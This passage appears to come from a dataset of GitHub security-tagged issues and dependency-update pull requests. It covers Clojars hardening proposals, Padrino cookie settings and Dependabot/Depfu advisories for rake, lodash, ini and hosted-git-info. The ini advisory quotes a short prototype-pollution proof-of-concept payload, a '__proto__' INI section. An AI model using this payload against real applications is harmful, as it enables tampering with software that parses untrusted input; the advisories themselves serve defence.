[debug] [<0.3078.0>] Successful cookie auth as: ""user-bombay""
[info] [<0.3113.0>] OS Process :: Error converting object to JSON: TypeError: toJSON.dispatcher[val.constructor.name] is not a function
[error] [<0.3078.0>] OS Process Error :: {os_process_error,""OS process timed out.""}
[debug] [<0.3078.0>] Minor error in HTTP request: {os_process_error,""OS process timed out.""}
[debug] [<0.3078.0>] Stacktrace: [{couch_db,update_doc,3},
             {couch_httpd_db,db_req,2},
             {couch_httpd_db,do_db_req,2},
             {couch_httpd,handle_request,5},
             {mochiweb_http,headers,5},
             {proc_lib,init_p_do_apply,3}]
[info] [<0.3078.0>] 127.0.0.1 - - 'POST' /wear/ 500
[debug] [<0.3078.0>] httpd 500 error response:
 {""error"":""os_process_error"",""reason"":""OS process timed out.""}

Removing the outfit validation from validate_doc_update.js, pushing the couchapp, replacing the outfit validatoin, and then pushing again seems to fix it for a while. Could be a bug in 0.11.0a.
",,no,"couch,security,"
halfbyte/jan.krutisch.de,909571637,"🚨 [security] Update rake: 0.9.2 → 13.0.3 (major)","<hr>

**Welcome to Depfu** 👋

This is one of the first three pull requests with dependency updates we've sent your way. We tried to start with a few easy patch-level updates. Hopefully your tests will pass and you can merge this pull request without too much risk. This should give you an idea how Depfu works in general.

After you merge your first pull request, we'll send you a few more. We'll never open more than seven PRs at the same time so you're not getting overwhelmed with updates.

[Let us know](mailto:hi@depfu.com) if you have any questions. Thanks so much for giving Depfu a try!

<hr>

<hr>

🚨 <b>Your current dependencies have known security vulnerabilities</b> 🚨

This dependency update fixes known security vulnerabilities. Please see the details below and assess their impact carefully. We recommend to merge and deploy this as soon as possible!
<hr>



Here is everything you need to know about this update. Please take a good look at what changed and the test results before merging this pull request.

### What changed?

#### ✳️ rake (0.9.2 → 13.0.3) · [Repo](https://github.com/ruby/rake/tree/v13.0.1) · [Changelog](https://github.com/ruby/rake/blob/master/History.rdoc)

<details>
<summary>Security Advisories 🚨</summary>
<h4><a href=""https://bounce.depfu.com/github.com/advisories/GHSA-jppv-gw3r-w3q8"">🚨 OS Command Injection in Rake</a></h4>
<blockquote><p>There is an OS command injection vulnerability in Ruby Rake &lt; 12.3.3 in<br>
Rake::FileList when supplying a filename that begins with the pipe character<br>
<code>|</code>.</p></blockquote>
</details>

<details>
<summary>Release Notes</summary>

<h4>13.0.3 (from changelog)</h4>
<blockquote><ul><li>
<p>Fix breaking change of execution order on TestTask. Pull request <a href=""https://bounce.depfu.com/github.com/ruby/rake/pull/368"">#368</a> by ysakasin</p>
</li></ul></blockquote>

<h4>13.0.2 (from changelog)</h4>
<blockquote><h4 id=""user-content-label-enhancements"">
<a href=""#enhancements-""></a>Enhancements<span><a href=""#label-Enhancements"">¶</a> <a href=""#top"">↑</a></span>
</h4>
<ul>
<li>
<p>Fix tests to work with current FileUtils Pull Request <a href=""https://bounce.depfu.com/github.com/ruby/rake/pull/358"">#358</a> by jeremyevans</p>
</li>
<li>
<p>Simplify default rake test loader Pull Request <a href=""https://bounce.depfu.com/github.com/ruby/rake/pull/357"">#357</a> by deivid-rodriguez</p>
</li>
<li>
<p>Update rdoc Pull Request <a href=""https://bounce.depfu.com/github.com/ruby/rake/pull/366"">#366</a> by bahasalien</p>
</li>
<li>
<p>Update broken links to rake articles from Avdi in README Pull Request <a href=""https://bounce.depfu.com/github.com/ruby/rake/pull/360"">#360</a> by svl7</p>
</li>
</ul></blockquote>
<p><em>Does any of this look wrong? <a href=""https://depfu.com/packages/rubygem/rake/feedback"">Please let us know.</a></em></p>
</details>

<details>
<summary>Commits</summary>
<p><a href=""https://github.com/ruby/rake/compare/65be0c78c84510be26e4c6abc1a3d12301f583aa...c2eeae2fe2b67170472a1441ebf84d3a238c3361"">See the full diff on Github</a>. The new version differs by 3 commits:</p>
<ul>
<li><a href=""https://github.com/ruby/rake/commit/c2eeae2fe2b67170472a1441ebf84d3a238c3361""><code>Bump version to 13.0.3</code></a></li>
<li><a href=""https://github.com/ruby/rake/commit/b6bf56c03249c215f844a6961b2ee9c98b6ffc2a""><code>Merge pull request #368 from ysakasin/fix_test_execution_order</code></a></li>
<li><a href=""https://github.com/ruby/rake/commit/37635e61ad2b663542216105ba23042f1e80683c""><code>Fix breaking change of execution order on TestTask</code></a></li>
</ul>
</details>




<hr>
<details>
<summary>👉 <b>No CI detected</b></summary>
<p>You don't seem to have any Continuous Integration service set up!</p>

<p>Without a service that will test the Depfu branches and pull requests, we can't inform you if incoming updates actually work with your app. We think that this degrades the
service we're trying to provide down to a point where it is more or less meaningless.</p>

<p>This is fine if you just want to give Depfu a quick try. If you want to really let Depfu help you keep your app up-to-date, we recommend setting up a CI system:</p>

 * [Circle CI](https://circleci.com), [Semaphore ](https://semaphoreci.com) and [Travis-CI](https://travis-ci.com) are all excellent options.
 * If you use something like Jenkins, make sure that you're using the Github integration correctly so that it reports status data back to Github.
 * If you have already set up a CI for this repository, you might need to check your configuration. Make sure it will run on all new branches. If you don’t want it to run on every branch, you can whitelist branches starting with `depfu/`.
</details>


---
![Depfu Status](http://golfwart.invalid/badges/9127b560ed153b4943607dfd5d5f82b8/stats.svg)

[Depfu](https://depfu.com) will automatically keep this PR conflict-free, as long as you don't add any commits to this branch yourself. You can also trigger a rebase manually by commenting with `@depfu rebase`.

<details><summary>All Depfu comment commands</summary>
<blockquote><dl>
<dt>@​depfu rebase</dt><dd>Rebases against your default branch and redoes this update</dd>
<dt>@​depfu recreate</dt><dd>Recreates this PR, overwriting any edits that you've made to it</dd>
<dt>@​depfu merge</dt><dd>Merges this PR once your tests are passing and conflicts are resolved</dd>
<dt>@​depfu close</dt><dd>Closes this PR and deletes the branch</dd>
<dt>@​depfu reopen</dt><dd>Restores the branch and reopens this PR (if it's closed)</dd>
<dt>@​depfu pause</dt><dd>Ignores all future updates for this dependency and closes this PR</dd>
<dt>@​depfu pause [minor|major]</dt><dd>Ignores all future minor/major updates for this dependency and closes this PR</dd>
<dt>@​depfu resume</dt><dd>Future versions of this dependency will create PRs again (leaves this PR as is)</dd>
</dl></blockquote>
</details>

","@depfu rebase",yes,"depfu,security,"
joestump/python-oauth2,450474,"Adding RSA SignatureMethod and test","That's pretty much it.  Uses PyCrypto if it's installed, raises NotImplementedError otherwise.
","I guess I should also mention that the patch includes unit testing
Hi @rick446! Thanks for the patch. It looks good and I'm glad to see it comes with a test. Two requests:
1. Could you add a test to ensure that verify() doesn't accept the request when it comes with a bogus signatures that wasn't actually made by the private key?
2. Could you add a test that the signature produced by your code matches the example signature  from http://wiki.oauth.net/w/page/12238556/TestCases . (If it helps you could also use these other implementations to check signatures or to generate example signatures: https://github.com/nshah/python-oauth/blob/master/oauth/signature_method/rsa_sha1.py , http://code.google.com/p/gdata-python-client/source/browse/src/gdata/oauth/rsa.py .)

Thanks again!

Regards,

Zooko
I have implemented this atop PyCrypto using X.509 certificates/public 
keys and RSA private keys in my Python implementation of OAuth 1.0.
The tests you have mentioned pass.

See: https://github.com/gorakhargosh/pyoauth/blob/master/pyoauth/protocol.py#L189

The project is at http://github.com/gorakhargosh/pyoauth/

HTH.

Cheers!
Khargosh.
",yes,"Security,Enhancement,"
apache/trafficserver,551619833,"Add better access control to XDebug plugin","The existing ""ACL"" mechanism is weak (obfuscating the header). Seeing that we've added a lot more information, some of which is sensitive, some which is computationally expensive, I feel strongly that we should add better ACL mechanisms ASAP. Being late in the game, I'm ok with postponing this until 9.1.x.

The suggestion would include

```
--allow=x-cache,x-cache-key
```
and
```
--deny=purge
```

And possibly,

```
--ip_allow=10.0.0.0-10.255.255.255 # or something like 10.0.0.0/8
```

We can discuss the default ""allowed"" fields here as well, but I think that x-cache alone is the one useful one. Also, bear in mind that a lot of this might be superseded with a new header in the future, Cache-Status:

https://tools.ietf.org/html/draft-ietf-httpbis-cache-header-02","This issue has been automatically marked as stale because it has not had recent activity. Marking it stale to flag it for further consideration by the community.",no,"Plugins,Security,Stale,"
walkscore/City-Go-Round,275824,"Improper escaping of JSON output for TransitApp","See `TransitApp::to_jsonable()`.

The ""tags"" and ""platforms"" entries in the dictionary get escaped with `cgi.escape`. This is nonsense and shouldn't be done here. HOWEVER, I was able to find code -- like in `nearby.html` for `platforms` -- that effectively assumes this escaping is done already. (I haven't found any examples of problems with the `tags` entry in the structure, and considered fixing just tags. But I'll refrain.)

This is a BAD precedent in the CGR code and must be fixed.
",,no,"bug,security,"
clojars/clojars-web,211887611,"Add captcha to new user page","We've had a few bot-created accounts lately (none of which have uploaded anything). We should try to  confirm the account is being created by a real user.

https://www.google.com/recaptcha/intro/index.html","Looking at this defect... some questions:

1. Google Identity: reCAPTCHA's API keys are tied to a Google identity - in order to create one for Clojars I'll need someone who has an official Clojars Google login of some kind. This identity/account will also receive email if Google detects problems (e.g. ""misconfiguration errors or an increase in suspicious traffic"".)
2. Type: There are two kinds reCAPTCHA V2 (easy) and Invisible reCAPTCHA (more complex.) Which kind do you want to use? I'm guessing the normal V2 type.
3. Domains: Each reCAPTCHA can cover multiple domains - which do we want protected? Just clojars.org or are there any other domains/subdomains, etc. we want covered by the same reCAPTCHA?
4. Owner Email(s): Each reCAPTCHA can have more than one owner email. Which email addresses do you want as owners?
5. Security Strength: There are three security preferences ranging from Easiest for users <---> Most secure with one midpoint.
6. Domain Name Validation: This is on by default but can be turned off. I assume you want to keep the default (on, more secure.)
7. Error reporting: Are there any requirements for this? Notify all errors via Sentry? Let Google reCAPTCHA error reporting do it's thing? I've never had it report any issues with my sites but they are low traffic so they aren't representative of what errors clarjars.org will encounter when using it.

I have several existing reCAPTCHAs and have no trouble creating one for Clojars but I really don't think you want me using my account for this. Sorry for the litany of questions but figured it is best to get all them addressed up front or switch to a different validation mechanism if there are issues.Thanks for taking a look at this Alan


>
>    1. Google Identity: reCAPTCHA's API keys are tied to a Google identity
>    - in order to create one for Clojars I'll need someone who has an official
>    Clojars Google login of some kind. This identity/account will also receive
>    email if Google detects problems (e.g. ""misconfiguration errors or an
>    increase in suspicious traffic"".)
>
I have a key created that we can start with. If we want to switch to a key
under a clojars-specific account, we can do that in the future I think.
Ping me on slack and I can get the key pair to you.

>
>    2. Type: There are two kinds reCAPTCHA V2 (easy) and Invisible
>    reCAPTCHA (more complex.) Which kind do you want to use? I'm guessing the
>    normal V2 type.
>
Agreed, let's start with V2.

>
>    3. Domains: Each reCAPTCHA can cover multiple domains - which do we
>    want protected? Just clojars.org or are there any other
>    domains/subdomains, etc. we want covered by the same reCAPTCHA?
>
Just clojars.org for now.

>
>    4. Owner Email(s): Each reCAPTCHA can have more than one owner email.
>    Which email addresses do you want as owners?
>
The key I created just emails me ATM, but I can add you as well for
testing if you like. Ideally, the owner should be contact@clojars.org, but
the form tells me that's an invalid email address for some reason. Maybe
you're not allowed a contact at the domain you are protecting? Dunno.


>    5. Security Strength: There are three security preferences ranging
>    from Easiest for users <---> Most secure with one midpoint.
>
The default appears to be the middle, so let's start there.

>
>    6. Domain Name Validation: This is on by default but can be turned
>    off. I assume you want to keep the default (on, more secure.)
>
Yes, let's keep the default.

>
>    7. Error reporting: Are there any requirements for this? Notify all
>    errors via Sentry? Let Google reCAPTCHA error reporting do it's thing? I've
>    never had it report any issues with my sites but they are low traffic so
>    they aren't representative of what errors clarjars.org will encounter
>    when using it.
>
 I guess it depends on the errors - if every auth failure is an error, I'm
fine ignoring those. I would just care about communication errors from
talking with google on the backend, and those should probably go through
sentry.

",no,"security,ready-for-work,"
clojars/clojars-web,817377209,"Support WebAuthn for Login.","WebAuthn, as defined here `https://en.wikipedia.org/wiki/WebAuthn` is a web standard used to secure authentication to web sites and services. It has been an W3C official standard since 2019. A very common example is the use of so-called security keys such as Yubico Yubikey, Google's Titan Security Key, and various other open source implementation such as Solo and so on.

WebAuthn is supported by all modern browsers, such as Firefox, Chromium, Safari, Brave and so on.

Presently, Clojars Web supports the use of 2FA via TOTP tokens - which is most excellent - for authentication to the ""admin"" area of each user's profile. 

It would be very good if, in addition to TOTP, the user had the ability to register a FIDO/FIDO2 compatible key against their profile, thus allowing users to authenticate via the security key instead of the TOTP token (the user can choose which one to authenticate by on login).

Since WebAuthn is ""built-in"" to modern browsers, the APIs are already there to implement it. 

More research would be required to determine how precisely it would fit into Clojars Web and how to properly obtain authentication against existing and new users.



","If this is up for grabs, I would give implementing this a shot next month 😄 @JohnnyJayJay That would be great! I don't know anything about WebAuthn (other than what @dharrigan taught me above :)), but would be happy to provide any guidance needed relating to the Clojars codebase.That would be much obliged. I joined the clojars Channel on the Clojurians Slack, I'll give you a heads up there when I need assistance. At first glance, it seems like there are a lot of components that need to be adjusted to implement this.",no,"security,"
clojars/clojars-web,198894293,"Allow users to link social accounts","Jcenter has a mechanism for publicly verifying and linking social accounts and emails to their profile, so that you can see that the `danielcompton` on Clojars is the same one as the `danielcompton` on GitHub. I'm not sure if we would want to do this directly or via Keybase? Not sure how closely we want to tie ourselves to Keybase, as a VC startup, they don't have a proven long term track record or clear future.",,no,"security,ready-for-work,"
clojars/clojars-web,619806808,"Scan deployments for deploy keys/passwords","`project.clj` files are included in deployment jars, and sometimes people put the clojars password/token in the `project.clj`. We should:

* add a validation that rejects deployments that contain a credential in `project.clj`
* scan all existing artifacts for any current passwords/tokens and disable the password/token, emailing the user",,no,"security,ready-for-work,"
clojars/clojars-web,483698960,"Detect and disable weak or compromised passwords","## Context

A common attack vector for compromising the development supply chain is checking if a breached password works on other services. For example, https://news.ycombinator.com/item?id=20747283.

## Proposal

**We should look at detecting passwords that have been found in breaches and disabling them, requiring users to set a new password.** We can use [Have I Been Pwned's API](https://haveibeenpwned.com/API/v3#PwnedPasswords) to check for this. For any new signups or password changes, we should look at increasing [password length requirements](https://github.com/clojars/clojars-web/blob/46abb2bef27084f253db55eed2f4a1bb07d2c843/src/clojars/web/user.clj#L54) from 8 to 10.

**We could also proactively check the top 1,000/10,000 passwords for all Clojars users, reset any existing accounts with weak passwords, and email people if this happened.** As passwords are hashed, we'd need to run the hash algorithm against every password we check which is (by design) slow. This would be a more aggressive move, but given what is happening in other package ecosystems, seems like it could be a good proactive move.

**We get plaintext user passwords when people are deploying to Clojars, this would be another good opportunity to check if their passwords haven't been breached.** If they have, I would suggest we reset the password, include an explanation in the response, and require them to choose a new password before allowing them to deploy.

## Other thoughts

Something I'm less sure about is whether we should store if we have verified a password is not in the breached list, or whether we check the breached status every time we see a password? If we store password status `not-breached?`, we would want to store the timestamp that we checked this. This would let us avoid making the check once we know a user's password is secure.

There is some precedent for resetting user passwords, see https://github.com/clojars/clojars-web/issues/47 and https://groups.google.com/group/clojure/browse_thread/thread/5e0d48d2b82df39b for more details.

These and other Clojars security related patches _may_ be eligible for Google's [Patch Rewards](https://www.google.com/about/appsecurity/patch-rewards/) or Mozilla's [MOSS awards](https://www.mozilla.org/en-US/moss/), though as Clojure is fairly niche this is not at all clear. In it's favour, many large companies with JVM codebases have Clojars setup in Nexus/Artifactory, so a compromise of Clojars could affect the wider JVM ecosystem, not just Clojure users.","@titanous points out that if we check on every login/deploy for a compromised password, then we don't need to do any batch scanning. Either an attacker or the user trying to login with that password would be forced to reset their password first by email, which hopefully only the user has access to.",no,"security,"
clojars/clojars-web,13917532,"Check JAR/POM/DB checksums to ensure integrity over time","We should set up periodic backups of jar/pom checksums and the DB so that it's easier to confirm we haven't been affected by possible attacks in the future.
","Open to suggestions of where these should go. Since they need to be initiated from off the box, we can't really use S3; we need another independent host to perform an rsync and save off checksums.
Does ""no S3"" also mean ""no AWS""?
",no,"security,"
clojars/clojars-web,1179195739,"Require MFA group-wide","Hi again,

a usual recommendation in post-mortem analyses for high-profile incidents in npm, RubyGems, etc is that 2FA should be  required.

(I don't have the links for that at hand but that hopefully is an uncontroversial opinion)

While probably requiring MFA for everyone would be a little excessive today, being able to require MFA within a group does sound reasonable.

A simple proposal would be: if a group has MFA required, any members cannot deploy to that group until they activate MFA.

This way we can increase the security in both companies using Clojars, and OSS teams (e.g. `cider`) which have a great degree of reach.

Cheers - V","An interesting read https://blog.rubygems.org/2022/06/13/making-packages-more-secure.html",no,"security,ready-for-work,"
clojars/clojars-web,159379181,"Prevent typo squatting","http://incolumitas.com/2016/06/08/typosquatting-package-managers/
http://incolumitas.com/data/thesis.pdf

There is a thesis written about achieving RCE through typo squatting on popular package managers. The situation isn't quite so bad in Clojars as people can't copy someone else's group name, and Leiningen doesn't execute arbitrary code when JARs are downloaded (we do it at runtime 😄). Nonetheless, we should look at the paper, identify what our risks are, and mitigate them.

c.f. http://www.nbu.gov.sk/skcsirt-sa-20170909-pypi/, https://www.pytosquatting.org","I haven't looked to see how they do it, but RubyGems has [yanked](https://github.com/rubygems/rubygems.org/wiki/Gems-yanked-and-accounts-locked#20-july-2019) gems where the names were invalid according to Levenshtein distance.",no,"security,"
clojars/clojars-web,381328178,"Allow delegation for administration to a single artifact, not just the whole group","If an open source maintainer wants to delegate admin or push rights to other maintainers, they are only able to do that at the granularity of the entire Group ID. Only being able to add to the group is not ideal, you may just want to give someone push access for a single artifact that they are maintaining, not everything in the entire group. For example, there are many artifacts under the [day8.re-frame](https://clojars.org/groups/day8.re-frame) Group ID. We may only want someone to be able to push a single artifact. Another motivating example is when someone no longer wants to maintain a particular library. They may want others to be able to push and administer a single artifact, but not everything else under their Group ID. This is the situation that [CLJ Commons](https://clj-commons.github.io) is in.

I propose that we add a new tier of permissions. Administrators of a group or project can add a user to a single project. They can add them as either an administrator or a standard user.

Adding this will need some careful thought as to how to design it securely and keep permissions understandable. There may also be other ways to achieve this goal, or perhaps this isn't a strong enough reason?

Ref: https://maven.apache.org/guides/mini/guide-relocation.html",,no,"feature,security,ready-for-work,"
spreadthesource/wooki,87523,"Provide a way to delete an account","This issue is a reminder to not forget to implement account deletion.

When deleting an account, books should be still available but user profile and linked data shouldn't be accessible anymore.

This behavior is open to discution.
","We should create an anymous author to attach the existing resources.
I would prefer something like a flag to the user model. This would offer the possibility to reopen the account later, like Facebook's account.

Deleting an account is just making it ""hidden"". The user can then reopen it and get all its data back.
What about french CNIL rules :)
The behavior I explained before could be the ""default"" way of deleting an account. We could then add a note explaining that if the user wants to permanently delete his data, he has to email the administrator or to go to a specific page.
you are right
Postponed to 0.3 for priority reasons
",no,"Security,"
spreadthesource/wooki,331023,"When user changes its username, AclCache should be cleared  ",,,no,"Security,"
spreadthesource/wooki,117995,"Enable 'remember me' service",,"Postponed to 0.3 for priority reasons
",no,"Security,"
spreadthesource/wooki,118406,"Enable OpenID/OAuth login ","This is common feature for all social websites now. We should take a look to this and maybe provide authentification based on that.
",,no,"Security,"
spreadthesource/wooki,88579,"Password recovery","We should not forget to implement this feature as well.
",,no,"Security,"
spreadthesource/wooki,88267,"Terms of service","When creating an account somewhere, there is always ""Terms of service"". We may need to incorporate some.
","Ok.
Move to 1.0 since we will provide a tool and a service after. However we can implement an entry point for people who wants to provide their own TOS.
",no,"Security,"
padrino/padrino-framework,60877451,"Make session cookies secure by default","I noticed that `enable :sessions` will set cookies with `HttpOnly` but not `Secure`. There should be a way of enabling this by default?
","Have a look in this post at Stackoverflow
http://stackoverflow.com/questions/12344088/how-to-make-rack-session-cookies-httponly
I already read that. Padrino should make it easier to enable secure sessions. Maybe check if `Rack::SSL` was added to the middleware stack.
I haven't done it yet but this is in my TODO list.
https://github.com/tobmatth/rack-ssl-enforcer
https://github.com/josh/rack-ssl
In fact, cookie without the secure attribute couldn't be transferred safely even if SSL is available.
So I basically agree with your opinion, but I worried our compatibility.
If we enable the option by default, existing project mixed of http and https will be broken.
So I’d like to suggest to provide the secure attribute as optional feature.
@namusyaka there was precedent where we opted for activating the feature instead of moving using a backward-compatible path: safe buffers.

There is the option of implementing the feature now and writing to log that it will be flipped with the next version if not explicitly set. Also, the encryption state of the connection is known through the request object, so it is possible to warn if a secure cookie goes out over a non-secure connection.
Where is this currently? I just ran into this trying to secure an updated padrino app (and esp now heroku is providing free cert mngmt for paid dynos). 

having `enable :sessions` should provide a secure option easily under the least principle of surprise and would be a great ""secure by default"" option. More to the point, trying to find documentation on this is old and outdated, which makes one slightly skittish turning on ssl in padrino (in fact, even disabling sessions and putting in rack-ssl-enforcer/rack-ssl tells me my csrf protection needs to also be disabled.). This should be way easier considering how many people are not security experts and really just wanna ""turn ssl on"" in a transparent way. 

I still continue to be floored by padrino though and the work you guys have all done. I am surprised how often i reach for it as a tool compared to rails or django these days.  =] 
@wakatara I'm not part of the team anymore, but I think most that's missing is someone having time and sending that PR :).

I don't see much opposition and I think this change makes great sense.Hehe... Fair enough. So, what needs to be done precisely, implement the rack-ssl gem solution inside the sessions that padrino uses? 

If I understand correctly (and I am by *no* means an expert on this, so please correct me if I'm wrong since I've just been reading up on it), in order to have this support ssl properly this needs two things?

1. Set and use session cookies _only_ over secure connections
2. Mark cookies as Secure so the browser doesn’t transmit them when requesting a non-secure URL

Is that correct? Would this support a minimum for being able to use enable :sessions after this on ssl and having it work? I'd be willing to take a shot at it, but might need a little help since I've never waded into the framework code.
",no,"security,"
benpickles/clocks,877916947,"[Security] Bump lodash from 4.17.20 to 4.17.21","Bumps [lodash](https://github.com/lodash/lodash) from 4.17.20 to 4.17.21. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-35jh-r3h4-6jhm"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Command Injection in lodash</strong>
<code>lodash</code> versions prior to 4.17.21 are vulnerable to Command Injection via the template function.</p>
<p>Affected versions: &lt; 4.17.21</p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/lodash/lodash/commit/f299b52f39486275a9e6483b60a410e06520c538""><code>f299b52</code></a> Bump to v4.17.21</li>
<li><a href=""https://github.com/lodash/lodash/commit/c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a""><code>c4847eb</code></a> Improve performance of <code>toNumber</code>, <code>trim</code> and <code>trimEnd</code> on large input strings</li>
<li><a href=""https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c""><code>3469357</code></a> Prevent command injection through <code>_.template</code>'s <code>variable</code> option</li>
<li>See full diff in <a href=""https://github.com/lodash/lodash/compare/4.17.20...4.17.21"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=lodash&package-manager=npm_and_yarn&previous-version=4.17.20&new-version=4.17.21)](https://dependabot.com/compatibility-score/?dependency-name=lodash&package-manager=npm_and_yarn&previous-version=4.17.20&new-version=4.17.21)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
benpickles/clocks,765835569,"[Security] Bump ini from 1.3.5 to 1.3.8","Bumps [ini](https://github.com/isaacs/ini) from 1.3.5 to 1.3.8. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-qqgx-2p2h-9c37"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Prototype Pollution</strong></p>
<h3>Overview</h3>
<p>The <code>ini</code> npm package before version 1.3.6 has a Prototype Pollution vulnerability.</p>
<p>If an attacker submits a malicious INI file to an application that parses it with <code>ini.parse</code>, they will pollute the prototype on the application. This can be exploited further depending on the context.</p>
<h3>Patches</h3>
<p>This has been patched in 1.3.6</p>
<h3>Steps to reproduce</h3>
<p>payload.ini</p>
<pre><code>[__proto__]
polluted = &quot;polluted&quot;
</code></pre>
<p>poc.js:</p>
<pre><code>var fs = require('fs')
&lt;/tr&gt;&lt;/table&gt; ... (truncated)
<p>Affected versions: &lt; 1.3.6
</code></pre></p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/npm/ini/commit/a2c5da86604bc2238fe393c5ff083bf23a9910eb""><code>a2c5da8</code></a> 1.3.8</li>
<li><a href=""https://github.com/npm/ini/commit/af5c6bb5dca6f0248c153aa87e25bddfc515ff6e""><code>af5c6bb</code></a> Do not use Object.create(null)</li>
<li><a href=""https://github.com/npm/ini/commit/8b648a1ac49e1b3b7686ea957e0b95e544bc6ec1""><code>8b648a1</code></a> don't test where our devdeps don't even work</li>
<li><a href=""https://github.com/npm/ini/commit/c74c8af35f32b801a7e82a8309eab792a95932f6""><code>c74c8af</code></a> 1.3.7</li>
<li><a href=""https://github.com/npm/ini/commit/024b8b55ac1c980c6225607b007714c54eb501ba""><code>024b8b5</code></a> update deps, add linting</li>
<li><a href=""https://github.com/npm/ini/commit/032fbaf5f0b98fce70c8cc380e0d05177a9c9073""><code>032fbaf</code></a> Use Object.create(null) to avoid default object property hazards</li>
<li><a href=""https://github.com/npm/ini/commit/2da90391ef70db41d10f013e3a87f9a8c5d01a72""><code>2da9039</code></a> 1.3.6</li>
<li><a href=""https://github.com/npm/ini/commit/cfea636f534b5ca7550d2c28b7d1a95d936d56c6""><code>cfea636</code></a> better git push script, before publish instead of after</li>
<li><a href=""https://github.com/npm/ini/commit/56d2805e07ccd94e2ba0984ac9240ff02d44b6f1""><code>56d2805</code></a> do not allow invalid hazardous string as section name</li>
<li>See full diff in <a href=""https://github.com/isaacs/ini/compare/v1.3.5...v1.3.8"">compare view</a></li>
</ul>
</details>
<details>
<summary>Maintainer changes</summary>
<p>This version was pushed to npm by <a href=""https://www.npmjs.com/~isaacs"">isaacs</a>, a new releaser for ini since your current version.</p>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=ini&package-manager=npm_and_yarn&previous-version=1.3.5&new-version=1.3.8)](https://dependabot.com/compatibility-score/?dependency-name=ini&package-manager=npm_and_yarn&previous-version=1.3.5&new-version=1.3.8)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
benpickles/clocks,879607714,"[Security] Bump hosted-git-info from 2.8.8 to 2.8.9","Bumps [hosted-git-info](https://github.com/npm/hosted-git-info) from 2.8.8 to 2.8.9. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-43f8-2h32-f4cj"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Regular Expression Denial of Service in hosted-git-info</strong>
The npm package <code>hosted-git-info</code> before 3.0.8 are vulnerable to Regular Expression Denial of Service (ReDoS) via regular expression shortcutMatch in the fromUrl function in index.js. The affected regular expression exhibits polynomial worst-case time complexity</p>
<p>Affected versions: &lt; 2.8.9</p>
</blockquote>
</details>
<details>
